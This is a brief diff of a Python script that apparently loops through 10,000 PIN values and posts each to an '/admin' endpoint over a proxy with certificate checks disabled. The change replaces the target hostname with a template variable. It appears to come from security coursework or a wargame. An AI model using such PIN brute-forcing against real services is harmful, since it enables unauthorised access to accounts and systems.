@@ -24,7 +24,7 @@ for i in range(0, 10000):
         "pin": pin
     }
     
-    r = requests.post("https://files.quoccabank.com/admin", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
+    r = requests.post("https://files.{q}.com/admin", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
     "Content-Type": "application/x-www-form-urlencoded"
     })
 
